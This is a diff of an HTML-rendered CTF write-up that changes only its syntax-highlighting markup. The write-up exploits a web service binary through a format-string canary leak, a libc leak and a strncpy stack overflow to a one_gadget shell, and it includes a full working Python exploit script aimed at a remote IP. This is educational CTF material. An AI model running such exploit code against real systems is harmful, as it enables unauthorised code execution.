@@ -286,68 +286,68 @@
 <p>This means we can only do <code>%1$p</code> to <code>%9$p</code>, unfortunately, the canary is at number 13.</p>
 <p>By debugging (more specifically, follow the chunk after the comment free until the malloc in render), I found that if I malloc a large chunk, it will be slowly cut into smaller one. This makes me thinking, if the chunk is large enough, maybe some magic could happen to do some merging stuff or things alike to make the allocated buffer larger?</p>
 <p>And turns out I was right. By experiment for some time, I found that by using this setting, I can get a <code>0x971</code> chunk:</p>
-<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span><span class="hljs-params">()</span>:</span>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span>():</span>
     register()
-    register(<span class="hljs-string">'fuck'</span>)
+    register(<span class="hljs-string">&#x27;fuck&#x27;</span>)
 
     number = <span class="hljs-number">0x3000</span> + <span class="hljs-number">0x30</span> <span class="hljs-comment"># v1 &lt;- remote</span>
-    payload = <span class="hljs-string">'x'</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">'x'</span> * <span class="hljs-number">12</span> + <span class="hljs-string">'%55$p'</span> + <span class="hljs-string">'x'</span> * (<span class="hljs-number">10</span><span class="hljs-number">-3</span>) <span class="hljs-comment"># working! for canary remote</span>
+    payload = <span class="hljs-string">&#x27;x&#x27;</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">&#x27;x&#x27;</span> * <span class="hljs-number">12</span> + <span class="hljs-string">&#x27;%55$p&#x27;</span> + <span class="hljs-string">&#x27;x&#x27;</span> * (<span class="hljs-number">10</span>-<span class="hljs-number">3</span>) <span class="hljs-comment"># working! for canary remote</span>
 
-    submit(payload, user=<span class="hljs-string">'fuck'</span>)
-    submit(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x100</span>)
-    submit(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">'fuck'</span>)
-    view_submit(user=<span class="hljs-string">'fuck'</span>)</code></pre><p>This is not stable, but it works 1 out of 10 approximately. Anyway, we get a controllable format string for at least 8 bytes, this is nice, we can do much of a work. The next thing to solve is that, when I do this, I found that only the first byte is shown:</p>
-<pre class="hljs"><code># This is not exactly what I got, but quite similar
-bc\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span></code></pre><p>After some digging, I found that this is because of the <code>vsnprintf</code> size limit.</p>
+    submit(payload, user=<span class="hljs-string">&#x27;fuck&#x27;</span>)
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">&#x27;fuck&#x27;</span>)
+    view_submit(user=<span class="hljs-string">&#x27;fuck&#x27;</span>)</code></pre><p>This is not stable, but it works 1 out of 10 approximately. Anyway, we get a controllable format string for at least 8 bytes, this is nice, we can do much of a work. The next thing to solve is that, when I do this, I found that only the first byte is shown:</p>
+<pre class="hljs"><code><span class="hljs-comment"># This is not exactly what I got, but quite similar</span>
+<span class="hljs-attribute">bc</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span>\x<span class="hljs-number">00</span></code></pre><p>After some digging, I found that this is because of the <code>vsnprintf</code> size limit.</p>
 <p class="img-container"><img src="./pngs/sizea.png" alt="sizea"></p>
 <p>The leaked output is in the outbuffer, but the size limit of the out buffer is <code>strlen(comment) + strlen(template)</code>. And, since the template already has a <code>%s</code>, so the comment is inserted, thus we only get one byte shown.</p>
 <p>To cope with this, we found that default case (when no comment is available), the size is more than we need (thanks to @Umut for finding this):</p>
 <p class="img-container"><img src="./pngs/default.png" alt="default"></p>
 <p>Now, we get a working leaking! We can now leak canary, yay~</p>
 <p>The complete leaking is like:</p>
-<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span><span class="hljs-params">()</span>:</span>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span>():</span>
     register()
-    register(<span class="hljs-string">'fuck'</span>)
-    register(<span class="hljs-string">'empty'</span>)
+    register(<span class="hljs-string">&#x27;fuck&#x27;</span>)
+    register(<span class="hljs-string">&#x27;empty&#x27;</span>)
 
     number = <span class="hljs-number">0x3000</span> + <span class="hljs-number">0x30</span> <span class="hljs-comment"># v1 &lt;- remote</span>
-    payload = <span class="hljs-string">'x'</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">'x'</span> * <span class="hljs-number">12</span> + <span class="hljs-string">'%55$p'</span> + <span class="hljs-string">'x'</span> * (<span class="hljs-number">10</span><span class="hljs-number">-3</span>) <span class="hljs-comment"># working! for canary remote</span>
+    payload = <span class="hljs-string">&#x27;x&#x27;</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">&#x27;x&#x27;</span> * <span class="hljs-number">12</span> + <span class="hljs-string">&#x27;%55$p&#x27;</span> + <span class="hljs-string">&#x27;x&#x27;</span> * (<span class="hljs-number">10</span>-<span class="hljs-number">3</span>) <span class="hljs-comment"># working! for canary remote</span>
 
-    submit(payload, user=<span class="hljs-string">'fuck'</span>)
-    submit(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x100</span>)
-    submit(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">'fuck'</span>)
-    view_submit(user=<span class="hljs-string">'empty'</span>)</code></pre><p>And libc leaking is quite illustrative, there&#39;s no libc address found on the stack, but fortunately we have another leaking bug, the <code>comment</code> leaking. By using the <code>comment</code> leaking, we get the libc address:</p>
-<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_libc</span><span class="hljs-params">()</span>:</span>
+    submit(payload, user=<span class="hljs-string">&#x27;fuck&#x27;</span>)
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">&#x27;fuck&#x27;</span>)
+    view_submit(user=<span class="hljs-string">&#x27;empty&#x27;</span>)</code></pre><p>And libc leaking is quite illustrative, there&#39;s no libc address found on the stack, but fortunately we have another leaking bug, the <code>comment</code> leaking. By using the <code>comment</code> leaking, we get the libc address:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_libc</span>():</span>
     register()
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
-        submit(<span class="hljs-string">'a'</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">'b'</span>), <span class="hljs-keyword">False</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+        submit(<span class="hljs-string">&#x27;a&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;b&#x27;</span>), <span class="hljs-literal">False</span>)
     view_submit()
 
 
-    submit(<span class="hljs-string">'a'</span>)
+    submit(<span class="hljs-string">&#x27;a&#x27;</span>)
     res = view_submit()
-    text_start = <span class="hljs-string">b'&lt;textarea id="compose-textarea" class="form-control" style="height: 300px" name="word"&gt;'</span>
-    idx = res.content.find(text_start) + len(text_start) + <span class="hljs-number">1</span>
-    content = res.content[idx:].strip(<span class="hljs-string">b' '</span>).split(<span class="hljs-string">b'\n'</span>)[<span class="hljs-number">0</span>]
-    libc_addr = u64(content.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))
+    text_start = <span class="hljs-string">b&#x27;&lt;textarea id=&quot;compose-textarea&quot; class=&quot;form-control&quot; style=&quot;height: 300px&quot; name=&quot;word&quot;&gt;&#x27;</span>
+    idx = res.content.find(text_start) + <span class="hljs-built_in">len</span>(text_start) + <span class="hljs-number">1</span>
+    content = res.content[idx:].strip(<span class="hljs-string">b&#x27; &#x27;</span>).split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>]
+    libc_addr = u64(content.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
     libc_base = libc_addr - <span class="hljs-number">0x1ebb61</span>
-    print(hex(libc_addr))
-    print(hex(libc_base))</code></pre><p>Note that the offset used to calculated libc_base is not stable.. I found at least three offsets, it can be inspected by last three digits. As for now I still remember <code>0x261</code> and <code>0xb61</code> possible. You can debug to find out the offset.</p>
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_addr))
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))</code></pre><p>Note that the offset used to calculated libc_base is not stable.. I found at least three offsets, it can be inspected by last three digits. As for now I still remember <code>0x261</code> and <code>0xb61</code> possible. You can debug to find out the offset.</p>
 <p>Now we have libc address and canary, and we have a stack overflow. Are we done? No!</p>
 <p>The stack overflow is caused by <code>strncpy</code>, and it cannot contain any zeros. But there&#39;s zero byte in canary, what should we do?</p>
 <p>For me, I used the reverse writing trick, where the first <code>tmp1</code> stack overflow writes the canary without zero byte and the return address (one gadget) and then, the <code>tmp2</code> is used to set the zero. This worked. But the problem is, let&#39;s take a look at the one gadgets we found (we cannot have a full rop beause of zero byte limit):</p>
 <pre class="hljs"><code>$ one_gadget libc.so<span class="hljs-number">.6</span> 
-<span class="hljs-number">0xe6e73</span> execve(<span class="hljs-string">"/bin/sh"</span>, r10, r12)
+<span class="hljs-number">0xe6e73</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, r10, r12)
 constraints:
   [r10] == NULL || r10 == NULL
   [r12] == NULL || r12 == NULL
 
-<span class="hljs-number">0xe6e76</span> execve(<span class="hljs-string">"/bin/sh"</span>, r10, rdx)
+<span class="hljs-number">0xe6e76</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, r10, rdx)
 constraints:
   [r10] == NULL || r10 == NULL
   [rdx] == NULL || rdx == NULL
 
-<span class="hljs-number">0xe6e79</span> execve(<span class="hljs-string">"/bin/sh"</span>, rsi, rdx)
+<span class="hljs-number">0xe6e79</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsi, rdx)
 constraints:
   [rsi] == NULL || rsi == NULL
   [rdx] == NULL || rdx == NULL</code></pre><p>And the final one is usable:</p>
@@ -370,91 +370,91 @@ constraints:
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
 <span class="hljs-keyword">import</span> sys 
 <span class="hljs-keyword">import</span> urllib.parse 
-
-<span class="hljs-comment">#url = 'http://localhost:39267' </span>
-url = <span class="hljs-string">'http://54.176.255.241:33717'</span> 
-submit_url = url + <span class="hljs-string">'/submit'</span> 
-submit_page = url + <span class="hljs-string">'/submit.html'</span> 
-register_url = url + <span class="hljs-string">'/register'</span> 
-
+ 
+<span class="hljs-comment">#url = &#x27;http://localhost:39267&#x27; </span>
+url = <span class="hljs-string">&#x27;http://54.176.255.241:33717&#x27;</span> 
+submit_url = url + <span class="hljs-string">&#x27;/submit&#x27;</span> 
+submit_page = url + <span class="hljs-string">&#x27;/submit.html&#x27;</span> 
+register_url = url + <span class="hljs-string">&#x27;/register&#x27;</span> 
+ 
 libc_base = <span class="hljs-number">0x7f6b1b06c000</span> 
 canary = <span class="hljs-number">0xfd15c59a46b75400</span>  
-
-
+ 
+ 
 one_gadget = <span class="hljs-number">0xE6C84</span> 
 <span class="hljs-comment">#one_gadget = 0xe6e79 </span>
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span><span class="hljs-params">(content, log=True, user=<span class="hljs-string">'admin'</span>)</span>:</span> 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span>(<span class="hljs-params">content, log=<span class="hljs-literal">True</span>, user=<span class="hljs-string">&#x27;admin&#x27;</span></span>):</span> 
     data = { 
-        <span class="hljs-string">'word'</span>: content 
+        <span class="hljs-string">&#x27;word&#x27;</span>: content 
     } 
-    r = requests.post(submit_url, data=data, cookies={<span class="hljs-string">'name'</span>: user, <span class="hljs-string">'pass'</span>: user}) 
+    r = requests.post(submit_url, data=data, cookies={<span class="hljs-string">&#x27;name&#x27;</span>: user, <span class="hljs-string">&#x27;pass&#x27;</span>: user}) 
     <span class="hljs-keyword">if</span> log: 
-        print(r.text) 
+        <span class="hljs-built_in">print</span>(r.text) 
     <span class="hljs-keyword">return</span> r 
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_submit</span><span class="hljs-params">(log=True, user=<span class="hljs-string">'admin'</span>)</span>:</span> 
-    r = requests.get(submit_page, cookies={<span class="hljs-string">'name'</span>: user, <span class="hljs-string">'pass'</span>: user}) 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_submit</span>(<span class="hljs-params">log=<span class="hljs-literal">True</span>, user=<span class="hljs-string">&#x27;admin&#x27;</span></span>):</span> 
+    r = requests.get(submit_page, cookies={<span class="hljs-string">&#x27;name&#x27;</span>: user, <span class="hljs-string">&#x27;pass&#x27;</span>: user}) 
     <span class="hljs-keyword">if</span> log: 
-        print(r.text) 
+        <span class="hljs-built_in">print</span>(r.text) 
     <span class="hljs-keyword">return</span> r 
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(user=<span class="hljs-string">'admin'</span>, log=False)</span>:</span> 
-    r = requests.get(register_url + <span class="hljs-string">'?name={user}&amp;passwd={user}&amp;re_passwd={user}'</span>.format(user=user)) 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>(<span class="hljs-params">user=<span class="hljs-string">&#x27;admin&#x27;</span>, log=<span class="hljs-literal">False</span></span>):</span> 
+    r = requests.get(register_url + <span class="hljs-string">&#x27;?name={user}&amp;passwd={user}&amp;re_passwd={user}&#x27;</span>.<span class="hljs-built_in">format</span>(user=user)) 
     <span class="hljs-keyword">if</span> log: 
-        print(r.text) 
-
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_libc</span><span class="hljs-params">()</span>:</span> 
+        <span class="hljs-built_in">print</span>(r.text) 
+ 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_libc</span>():</span> 
     register() 
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>): 
-        submit(<span class="hljs-string">'a'</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">'b'</span>), <span class="hljs-keyword">False</span>) 
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): 
+        submit(<span class="hljs-string">&#x27;a&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;b&#x27;</span>), <span class="hljs-literal">False</span>) 
     view_submit() 
-
-
-    submit(<span class="hljs-string">'a'</span>) 
+ 
+ 
+    submit(<span class="hljs-string">&#x27;a&#x27;</span>) 
     res = view_submit() 
-    text_start = <span class="hljs-string">b'&lt;textarea id="compose-textarea" class="form-control" style="height: 300px" name="word"&gt;'</span> 
-    idx = res.content.find(text_start) + len(text_start) + <span class="hljs-number">1</span> 
-    content = res.content[idx:].strip(<span class="hljs-string">b' '</span>).split(<span class="hljs-string">b'\n'</span>)[<span class="hljs-number">0</span>] 
-    libc_addr = u64(content.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)) 
+    text_start = <span class="hljs-string">b&#x27;&lt;textarea id=&quot;compose-textarea&quot; class=&quot;form-control&quot; style=&quot;height: 300px&quot; name=&quot;word&quot;&gt;&#x27;</span> 
+    idx = res.content.find(text_start) + <span class="hljs-built_in">len</span>(text_start) + <span class="hljs-number">1</span> 
+    content = res.content[idx:].strip(<span class="hljs-string">b&#x27; &#x27;</span>).split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>] 
+    libc_addr = u64(content.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
     libc_base = libc_addr - <span class="hljs-number">0x1ebb61</span> 
-    print(hex(libc_addr)) 
-    print(hex(libc_base)) 
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_addr)) 
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base)) 
     libc_base = libc_addr - <span class="hljs-number">0x1ec261</span> 
-    print(hex(libc_base)) 
-
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span><span class="hljs-params">()</span>:</span> 
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base)) 
+ 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_canary</span>():</span> 
     register() 
-    register(<span class="hljs-string">'fuck'</span>) 
-    register(<span class="hljs-string">'empty'</span>) 
-
+    register(<span class="hljs-string">&#x27;fuck&#x27;</span>) 
+    register(<span class="hljs-string">&#x27;empty&#x27;</span>) 
+ 
     number = <span class="hljs-number">0x3000</span> + <span class="hljs-number">0x30</span> <span class="hljs-comment"># v1 &lt;- remote </span>
-    payload = <span class="hljs-string">'x'</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">'x'</span> * <span class="hljs-number">12</span> + <span class="hljs-string">'%55$p'</span> + <span class="hljs-string">'x'</span> * (<span class="hljs-number">10</span><span class="hljs-number">-3</span>) <span class="hljs-comment"># working! for canary remote </span>
-
-    submit(payload, user=<span class="hljs-string">'fuck'</span>) 
-    submit(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x100</span>) 
-    submit(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">'fuck'</span>) 
-    view_submit(user=<span class="hljs-string">'empty'</span>) 
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span> 
+    payload = <span class="hljs-string">&#x27;x&#x27;</span> * (number - <span class="hljs-number">0x18</span>) + <span class="hljs-string">&#x27;x&#x27;</span> * <span class="hljs-number">12</span> + <span class="hljs-string">&#x27;%55$p&#x27;</span> + <span class="hljs-string">&#x27;x&#x27;</span> * (<span class="hljs-number">10</span>-<span class="hljs-number">3</span>) <span class="hljs-comment"># working! for canary remote </span>
+ 
+    submit(payload, user=<span class="hljs-string">&#x27;fuck&#x27;</span>) 
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>) 
+    submit(<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span>), user=<span class="hljs-string">&#x27;fuck&#x27;</span>) 
+    view_submit(user=<span class="hljs-string">&#x27;empty&#x27;</span>) 
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span> 
     rop = p64(one_gadget + libc_base) 
-    payload_key = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">'b'</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span> + <span class="hljs-string">'a'</span> + urllib.parse.quote(p64(canary)[<span class="hljs-number">1</span>:]) + <span class="hljs-string">'x'</span> * <span class="hljs-number">24</span> + urllib.parse.quote(rop) 
-    payload_value = <span class="hljs-string">'p'</span> * <span class="hljs-number">0x108</span> 
-    exp_url = url + <span class="hljs-string">'?'</span> + payload_key + <span class="hljs-string">'='</span> + payload_value 
+    payload_key = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;a&#x27;</span> + urllib.parse.quote(p64(canary)[<span class="hljs-number">1</span>:]) + <span class="hljs-string">&#x27;x&#x27;</span> * <span class="hljs-number">24</span> + urllib.parse.quote(rop) 
+    payload_value = <span class="hljs-string">&#x27;p&#x27;</span> * <span class="hljs-number">0x108</span> 
+    exp_url = url + <span class="hljs-string">&#x27;?&#x27;</span> + payload_key + <span class="hljs-string">&#x27;=&#x27;</span> + payload_value 
     r = requests.get(exp_url) 
-
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>: 
-    op = <span class="hljs-string">''</span> 
-    <span class="hljs-keyword">if</span> len(sys.argv) &gt;= <span class="hljs-number">2</span>: 
+ 
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: 
+    op = <span class="hljs-string">&#x27;&#x27;</span> 
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt;= <span class="hljs-number">2</span>: 
         op = sys.argv[<span class="hljs-number">1</span>] 
-
-    <span class="hljs-keyword">if</span> op == <span class="hljs-string">'reg'</span>: 
+ 
+    <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;reg&#x27;</span>: 
         register() 
-    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">'canary'</span>: 
+    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;canary&#x27;</span>: 
         leak_canary() 
-    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">'libc'</span>: 
+    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;libc&#x27;</span>: 
         leak_libc() 
     <span class="hljs-keyword">else</span>: 
         main() </code></pre>        </article>
